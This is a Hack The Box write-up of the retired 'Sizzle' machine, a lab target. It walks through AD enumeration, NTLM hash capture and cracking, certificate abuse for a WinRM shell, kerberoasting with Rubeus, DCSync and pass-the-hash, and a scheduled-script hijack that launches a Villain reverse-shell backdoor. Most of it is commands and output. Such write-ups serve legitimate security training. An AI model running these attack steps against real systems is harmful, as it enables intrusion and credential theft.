
# HTB (Sizzle - Retired) Writeup
### Website: [Hack The Box :: Hack The Box](https://app.hackthebox.com/machines/Sizzle)

![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526132810.png)


## Recon
#### NMap Enumeration
```bash
─$ sudo python3 ./rs2nm.py 10.129.222.170 /home/kali/Desktop/HackTheBox/Boxes/NonComp/Insane/Sizzle/            
Just gonnae run a quick wee rustscan test
You selected: 10.129.222.170
Estimated Time Remaining: 1h 35m

Just kidding, only going to take a few seconds, they say


OOoh, There are a few ports open 
Gonnae copy these to NMAP for ye, for some intricate.... ;)  scanning...
(21,53,80,135,139,3268,464,443,389,5986,5985,47001,49664,49665,49666,49668,49673,49690,49691,49693,49697,49698,49710,49723)
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 10:32 BST
Nmap scan report for 10.129.222.170
Host is up (0.032s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain      Simple DNS Plus
80/tcp    open  http        Microsoft IIS httpd 10.0
|_http-title: Site doesnt have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
389/tcp   open  ldap        Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2024-05-26T09:33:58+00:00; -1s from scanner time.
443/tcp   open  ssl/http    Microsoft IIS httpd 10.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2024-05-26T09:33:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
464/tcp   open  kpasswd5?
3268/tcp  open  ldap        Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2024-05-26T09:33:58+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2024-05-26T09:33:58+00:00; 0s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_http-title: Not Found
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc       Microsoft Windows RPC
49665/tcp open  msrpc       Microsoft Windows RPC
49666/tcp open  msrpc       Microsoft Windows RPC
49668/tcp open  msrpc       Microsoft Windows RPC
49673/tcp open  msrpc       Microsoft Windows RPC
49690/tcp open  ncacn_http  Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc       Microsoft Windows RPC
49693/tcp open  msrpc       Microsoft Windows RPC
49697/tcp open  msrpc       Microsoft Windows RPC
49698/tcp open  msrpc       Microsoft Windows RPC
49710/tcp open  msrpc       Microsoft Windows RPC
49723/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.00 seconds

I've saved your loot here: /home/kali/Desktop/HackTheBox/Boxes/NonComp/Insane/Sizzle/10.129.222.170_nmap_results
Checking for open Active Directory ports and extracting domain information...
Looks like a Domain. Port 389 found with LDAP information:
389/tcp   open  ldap        Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
Extracted domain: HTB.LOCAL
Added HTB.LOCAL to /etc/hosts with IP 10.129.222.170

```
```(21,53,80,135,139,3268,464,443,389,5986,5985,47001,49664,49665,49666,49668,49673,49690,49691,49693,49697,49698,49710,49723)```

**Found domain:**  HTB.LOCAL
**Found DNS:** sizzle.HTB.LOCAL

```
21/tcp    open  ftp         Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

```

### SMB
```bash
┌──(kali㉿kali)-[~/…/Boxes/NonComp/Insane/Sizzle]
└─$ sudo smbmap -H htb.local
[sudo] password for kali: 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 0 hosts serving SMB

```

SMBMap doesn't bring up anything useful however SMBClient brought up a few shares
```bash
┌──(kali㉿kali)-[~/…/Boxes/NonComp/Insane/Sizzle]
└─$ smbclient -N -L \\\\HTB.LOCAL            

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to HTB.LOCAL failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

After scanning through each of them to see what I had access to, I came across the ``Department Shares Disk`` which allowed access
```bash
=Department Shares=
  .                                   D        0  Tue Jul  3 16:22:32 2018
  ..                                  D        0  Tue Jul  3 16:22:32 2018
  Accounting                          D        0  Mon Jul  2 20:21:43 2018
  Audit                               D        0  Mon Jul  2 20:14:28 2018
  Banking                             D        0  Tue Jul  3 16:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 20:15:01 2018
  Devops                              D        0  Mon Jul  2 20:19:33 2018
  Finance                             D        0  Mon Jul  2 20:11:57 2018
  HR                                  D        0  Mon Jul  2 20:16:11 2018
  Infosec                             D        0  Mon Jul  2 20:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 20:13:59 2018
  IT                                  D        0  Mon Jul  2 20:12:04 2018
  Legal                               D        0  Mon Jul  2 20:12:09 2018
  M&A                                 D        0  Mon Jul  2 20:15:25 2018
  Marketing                           D        0  Mon Jul  2 20:14:43 2018
  R&D                                 D        0  Mon Jul  2 20:11:47 2018
  Sales                               D        0  Mon Jul  2 20:14:37 2018
  Security                            D        0  Mon Jul  2 20:21:47 2018
  Tax                                 D        0  Mon Jul  2 20:16:54 2018
  Users                               D        0  Tue Jul 10 22:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 20:32:58 2018

                7779839 blocks of size 4096. 3357598 blocks available
```

all folders came up empty except ZZ_ARCHIVE, however, all the files were just nulled the user's folder brought up these names
```amanda amanda_adm bill bob chris henry joe jose lkys37en morgan mrb3n Public```

I was able to write to the Users/Public folder so I attempted to upload a CC 
#### FTP
Because FTP allows anonymous access, I logged in to see what was available but the directory was empty
```bash
┌──(kali㉿kali)-[~/Desktop/Rustscan2NMap]
└─$ ftp htb.local
Connected to HTB.LOCAL.
220 Microsoft FTP Service
Name (htb.local:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||62114|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

#### HTTP
I checked the website that is on this box, but it only shows a gif of juicy bacon
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526104516.png)

#### LDAP - TCP 389 
I was unable to find anything from any LDAP enumeration.

## Exploitation

I was able to upload a file to get the hash for the user amanda

```
[+] Listening for events... [SMBv2] NTLMv2-SSP Client : 10.10.10.103 [SMBv2] NTLMv2-SSP Username : HTB\amanda [SMBv2] NTLMv2-SSP Hash : amanda::HTB:ee1fd9c7201c2a31:F4FD2428AB3107D72E46472A28ADD345:0101000000000000C0653150DE09D2017B51A16FDF651C2D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000AACD5ACB75C0E2B759DD79265572393CA79CF1AD76837FDD836686E2DC5F78BD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003500000000000000000000000000
```

using hashcat I found the password to be ``Ashare1972``

#### WinRM - Failed
#### Share Access- 
```
┌──(kali㉿kali)-[~/…/NonComp/Insane/Sizzle/Payloads]
└─$ smbmap -H htb.local -u amanda -p Ashare1972                                                                                                                                 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.222.170:445      Name: htb.local                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        Department Shares                                       READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Operations                                              NO ACCESS
        SYSVOL                                                  READ ONLY       Logon server share 

```

#### LDAP Dump
```
──(kali㉿kali)-[~/…/NonComp/Insane/Sizzle/Payloads]
└─$ ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 htb.local -o ../Loot/ldap/
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

```
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526113127.png)
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526113031.png)

#### Shell

I was able to login to the certsrv page as Amanda. 
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526113434.png)

I can create a new certificate

![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526123726.png)
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526132941.png)
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526133008.png)

I can then download the key from the certificate manager and save as a ```.p12``` file and convert it to the files I need 


![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526133043.png)

```bash
──(kali㉿kali)-[~/…/NonComp/Insane/Sizzle/Payloads]
└─$ openssl pkcs12 -in amanda.p12 -nocerts -out amanda.key 
Enter Import Password: 
Enter PEM pass phrase: 
Verifying - Enter PEM pass phrase: 

──(kali㉿kali)-[~/…/NonComp/Insane/Sizzle/Payloads]
└─$ openssl pkcs12 -in amanda.p12 -clcerts -nokeys -out amanda.crt Enter Import Password:
```

I then Generated a CSR and key using OpenSSL and submitted it back to the ADCS page

```bash
──(kali㉿kali)-[~/…/NonComp/Insane/Sizzle/Payloads]
└─$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr Generating a RSA private key .......................................................................................+++++ ..............................................................................+++++ writing new private key to 'amanda.key' 
----- 
You are about to be asked to enter information that will be incorporated into your certificate request. 
What you are about to enter is what is called a Distinguished Name or a DN. 
There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. 
----- 
Country Name (2 letter code) [AU]: 
State or Province Name (full name) [Some-State]: 
Locality Name (eg, city) []: 
Organization Name (eg, company) [Internet Widgits Pty Ltd]: 
Organizational Unit Name (eg, section) []: 
Common Name (e.g. server FQDN or YOUR name) []: 
Email Address []: 

Please enter the following 'extra' attributes to be sent with your certificate request A challenge password []: 
An optional company name []:
```
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526133558.png)

#### WinRM Shell 

I used a Python script to connect to the shell using the ``CRT`` files I generated (Spiced it up for anyone who wants to use it )

```python
import winrm
import sys

# Establish the connection
try:
    session = winrm.Session(
        'https://10.129.223.33:5986/wsman',
        auth=('amanda.crt', 'amanda.key'),
        transport='ssl',
        server_cert_validation='ignore'
    )
except Exception as e:
    print("Someone broke something because I failed to establish a connection: " + str(e))
    sys.exit(1)

# Function to execute a command and print the output
def execute_command(shell, command):
    try:
        response = shell.run_ps(command)
        if response.status_code == 0:
            print(response.std_out.decode('utf-8').strip())
        else:
            print(response.std_err.decode('utf-8').strip(), file=sys.stderr)
    except Exception as e:
        print("Someone broke something because the command execution failed: " + str(e))

# Open a PowerShell shell
try:
    with session.protocol.open_shell() as shell:
        command = ""
        while command.strip().lower() != "exit":
            whoami = session.run_ps('whoami').std_out.decode('utf-8').strip()
            computername = session.run_ps('$env:computername').std_out.decode('utf-8').strip()
            pwd_name = session.run_ps('(gi $pwd).Name').std_out.decode('utf-8').strip()
            prompt = f"PS {whoami}@{computername} {pwd_name}> "
            print(prompt, end="")
            command = input().strip()
            if command.lower() == "exit":
                break
            execute_command(shell, command)
except Exception as e:
    print("Someone broke something because the shell session failed: " + str(e))
finally:
    print("Bye :(")

```

Success!
```bash
┌──(kali㉿kali)-[~/…/Boxes/NonComp/Insane/Sizzle/ScriptKiddyStuff]
└─$ python3 imnotabackdoor.py
PS htb\amanda@SIZZLE Documents> whoami 
htb\amanda
```

Sadly, there was no flag in Amanda's account, so I presume it is in ``MRLKY``'s account, tried just going there but of course, that would be too easy.

I set a villain session so I could be lazy

```
villain -p 6501 -n 4443 -x 8080 -f 8888

    ┬  ┬ ┬ ┬  ┬  ┌─┐ ┬ ┌┐┌
    └┐┌┘ │ │  │  ├─┤ │ │││
     └┘  ┴ ┴─┘┴─┘┴ ┴ ┴ ┘└┘
                 Unleashed

[Meta] Created by t3l3machus
[Meta] Follow on Twitter, HTB, GitHub: @t3l3machus
[Meta] Thank you!

[Info] Initializing required services:
[0.0.0.0:6501]::Team Server
[0.0.0.0:4443]::Netcat TCP Multi-Handler
[0.0.0.0:8080]::HoaxShell Multi-Handler
[0.0.0.0:8888]::HTTP File Smuggler

Villain > generate payload=windows/netcat/powershell_reverse_tcp_v2 lhost=tun0
Generating backdoor payload...
<<SNIP>>
Copied to clipboard!
[Shell] Backdoor session established on 10.129.223.33
```


After having a quick look around to see how to break this jail, I found AppLocker isn't restricting write/Execute access to the /windows/temp folder but I couldn't see what is inside it 🤨🤨 worth a shot I guess.

I found a tool called [GhostPack/Rubeus:(github.com)](https://github.com/GhostPack/Rubeus)  so I built this and placed the exe in the /windows/temp folder.

```powershell
PS C:\windows\temp> .\imnotmalware.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

This found the hash for Mr ``MRLKY``

tried to get the SPN's 

```bash
┌──(kali㉿kali)-[~/…/Boxes/NonComp/Insane/Sizzle/ScriptKiddyStuff]
└─$ Impacket-GetUserSPNs -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out

Impacket v0.12.0.dev1 - Copyright 2023 Fortra
Password: 
ServicePrincipalName Name MemberOf PasswordLastSet LastLogon 
-------------------- ----- -----------------------------------------------------
http/sizzle mrlky CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL 2018-07-10 14:08:09 2018-07-12 10:23:50

[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

I was stumped for a good 15 minutes figuring out what was wrong here not gonna lie. 

turns out the date was wrong by about 10 minutes. (shocker), probably should've googled it.

once I fixed that issue 

```bash
┌──(kali㉿kali)-[~/…/Boxes/NonComp/Insane/Sizzle/ScriptKiddyStuff]
└─$ Impacket-GetUserSPNs -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out

Impacket v0.12.0.dev1 - Copyright 2023 Fortra
<<snip>>

$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$7e9b64b7d5699f77c24bb5e091f958b9$b2f621ccaf317fe23bb8d38bcf46e7e6db72ee80bfc46d74f49d8f289bd00fd0cb00530f07ab266b032b15451b56db089864f7ae9c75e68d5a797e409f394bafffab1e28baa735af5bef6d9974d2239f1b856ebae73f1393aa9ca20af62f21e3ba8c83b3c749e6a9f2ed06adbe5555ae508db7cf85416862ceaa000fe3af85024eb14c340d52c00ed83aa9eaed3956666215987e020adcde5576fe0af35bd80ee552503400a8feb92ca030ed75c4934fc4508c10090a1f074ad738b26c054d9efd9bec6c9912f8a5d02896dd5ab34584eab6653b11ad826bf08c24f218d236e603ec25a8d40c7f0fd35fecce1e57a0ad899208ccec1df848e0139f2549ac4a2f5d3ba3baf1d51b3b2644f70f65a8db016d41f8cc459d961d640eedd93e2ce08ba17f65a892c4e374e8d4bb45f890a210156dc17d569c6b44b9680b5e3d42259a7b12a7e1cb5d7120e87771924b16d1c33f8eaca5d4337db36d80a7a0843702fa8415ae94fb389e4419012054fdaf237fb2477c8974f1be2a73cbc81ffd994904114b1ee4ca31a555eab060df88f5255d88ec3677133dc255c6d7703eac3fac958fbd74ab429b7f33f0f7d206e4fdcbb26bce4143dfd69101dc46e141c96697ee38902368b6a3eb216792962ae2228b186f718b7e69306f275320ed1030d830950f042f6e02fb6593b369806c324c521cbc2f4092e59339dc88abcd5f348d56ede5585bb05d62097a218f38a32122afca6cd8d507b8c753ec80dc492bf0975d2071cbd57f1e81b23c26c0a05876c37da6127273c6e6b746f3d90d79c4c9f37ff4e9d628d570b01d71df5f7b313b1c0430102b8b4f815eee195f3b27cc1900a7f8c457612da76c9ad95d3a5cfa3220c2c26da25c7a0a8edc95ad85baa386b808326ad2347c3c30e79abe85964fabc4423ff0fe786885022de638027b030784bde2f4816922ab0ad795ba5c5fcae70a01b0e731ee48a39041989c409aca5e84648d1c322f36e213db9988a9550cc5477f77adb681cb310306f00324bbad57b98844d2a426f32f946fd2f2fdba4117a1ae4299fcb60aa4c6e71eea3168e7f1ff30dbff3e62de87cf27bdd66e64e0c9579a6dbc2eabdcf9b83fe7cbf5982762b1d53226d6e6a1107d32d46f5b0128d3ecfd9da61f8235e942734762d5771c92b85480dcd66d3924110131793ebb4885ff197760ca596d9264b4ed1f2d6c7865149d00511737b6eac12a0d7c531535ab5a65087eb510507c5f29d1
```

stuck the hash in Hashcat and got the very secure password.

```

Dictionary cache hit: 
* Filename..: /usr/share/wordlists/rockyou.txt 
* Passwords.: 14344385 
* Bytes.....: 139921507 
* Keyspace..: 14344385 
- Device #1: autotuned kernel-accel to 32 
- Device #1: autotuned kernel-loops to 1 
- $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$4cc14f288e6087d7ebf2ab6750a0ac09$e8434ab472bf2203b18ff05437a50452fedef5ab2655023cbbc09834dd834d9076337d5050be3c3a3306351c05371aec98c15d93336c6cbefaf081061f71745874746215d8053ada5664e4f4d55d0b7ad161d8cca3c3585f0974d45a0e889da45a6f3658875f6ba91f5e7a26b0a664142fd48e4931f28e8f32dd90c776db6ccf994855a3d6f21b365bc40b24a42c5ad9fadb424852c8a3c8e3a73bb7e1ea549f0a971015f954d9b468df5359a00fbafceee9b5fab173106875eb6ebb851ebf6655f6d4567b9b3e91d5669ab42fffd82309606420ca08600ad1e1fdd99eba461b2d5d23851bf55d37b8ee75c3d371f7deb7e9de9e69953853df3e1023f1cdb88bc3ba44d8ecf1d7b54b841272b3c48a5a0ddd2918d2137bb2f2e09c8d1186fb29d2b2ef1504fbf836e252f98a23190b376bc7a637bf4b6c0595a7f7dba7f3eade2d13b160b91c134a884b52e6eec2732a274e91f892d5b1d33cb030d3f6371ad61bdd2cfcb64c4412eb4a04d53b4a3481e6f822fcb78467e8bec59ba7779793a7e66d0e8cbcc6ab115f311f7d1d4c9bf0a19e120da35ad5ce2f2475dae50227558af76245237b8806fd1ff82f5a107dae70167c43cec018d8caddcbb2b9da726758cc62c5e39c710b61a6e0d8c7050f86236d3293c107f1927d9ca24b3f26ad8b6d93fcb29f9b69614580f34e3b7e786f97b25709eff561c865d30c66318d7d9ff894003589cef4f7e4b40e209983737f5d0eefc53e99a19ba6ed360832b81cf87dc8e9c0cec2b710ac0b203f369543a978753a984c6cf2e14987e13772cdf96ab110514899f7251d076244e9aac1f0d84bf0813f806d5ea5ad9162d41fc3b7c600202407a418b23d7a51828e73b49e8f8e69b8720c40a1cb2cfd96bfa2554e8de8988030dc68e73ced5303ee47d2bf7b0cee71648bd18f0c32de7a16d42e5042b94ed0a0a1369b7de7d9f6886acd54a5beb60a2075d8461baf84f207f454839d144d318d23b1bbb35298e414af65330c0b36cf8d3502937b575982857b91caffe252d0aeebf55c920312ba03f03294f39db08418766f524f5b2d0b673228fde39805d759c15e128d31c4cc02c7baaeba93559a044b47cc501a4a873055f95b1b8f03008de3ee005bc344157b3c2e605c7a973d5aa90c899cb44a03df2738fc50e74b2f6e2b0c3a605e0f8114009c5a05ff2351a0c149fe76342909601f595a662af738d0f4a5c0fec6a2fc76098477301083dc832b076640:Football#7
```

Seems like MRLKY likes Football ``Football#7`` do love a good user flag.

Opened up Bloodhound and grabbed details from the server, MRLKY can use ``GetChanges`` and ``GetChangesAll`` from the domain
![](https://github.com/deannreid/CTF-Writeups/blob/main/HackTheBox/Retired/Insane/Sizzle/Images/Pasted%20image%2020240526141512.png)

Skipping all the boring stuff - I was able to use ``Impacket-SecretsDump`` to get domain credentials for the Administrator and use crackmap to pass the hash and wmiexec to get a shell 

```
┌──(kali㉿kali)-[~/…/Boxes/NonComp/Insane/Sizzle]
└─$ crackmapexec smb 10.129.223.33 -u administrator -H f6b7160bfc91823792e0ac3a162c9267 
SMB         10.129.223.33   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.223.33   445    SIZZLE           [+] HTB.LOCAL\administrator:f6b7160bfc91823792e0ac3a162c9267 (Pwn3d!)

```

```
─$ impacket-wmiexec -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.129.223.33
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
htb\administrator

```
## Flags
### User: 9f9e26f3dc21e7a***
### Root: 7ae3c7c5fef8b***


## After going through the pain and suffering of the above. 

### Clean.bat File

The Admin Home directory permissions allow Amanda to read direct folders in this case ``C:\Users\Administrator\Desktop`` but not ``C:\Users\Administrator\`` or the root.txt file. 

In the Administrators Document folder, there is a ``clean.bat`` file that clears the ``C:\Department Shares\Users\Public`` folder and seems to be scheduled to run every couple of minutes.

Turns out. Good ole' Mandy has full control over this file

```powershell
PS HTB\amanda@SIZZLE documents> icacls clean.bat 
clean.bat NT AUTHORITY\SYSTEM:(I)(F) 
		  BUILTIN\Administrators:(I)(F) 
		  HTB\Administrator:(I)(F) 
		  HTB\amanda:(I)(F)
```

So I can upload my Villian exe to the folder and run a call from the clean.bat file 

```
villain -p 6501 -n 4443 -x 8080 -f 8888

    ┬  ┬ ┬ ┬  ┬  ┌─┐ ┬ ┌┐┌
    └┐┌┘ │ │  │  ├─┤ │ │││
     └┘  ┴ ┴─┘┴─┘┴ ┴ ┴ ┘└┘
                 Unleashed

[Meta] Created by t3l3machus
[Meta] Follow on Twitter, HTB, GitHub: @t3l3machus
[Meta] Thank you!

[Info] Initializing required services:
[0.0.0.0:6501]::Team Server
[0.0.0.0:4443]::Netcat TCP Multi-Handler
[0.0.0.0:8080]::HoaxShell Multi-Handler
[0.0.0.0:8888]::HTTP File Smuggler

Villain > generate payload=windows/netcat/powershell_reverse_tcp_v2 lhost=tun0
Generating backdoor payload...
<<SNIP>>
Copied to clipboard!
[Shell] Backdoor session established on 10.129.223.33
Villain > backdoors
<<Snip>

PS C:\Windows\system32 > whoami
htb\administrator
```

I could then just visit the Desktop of all users that got the User and Root flag.
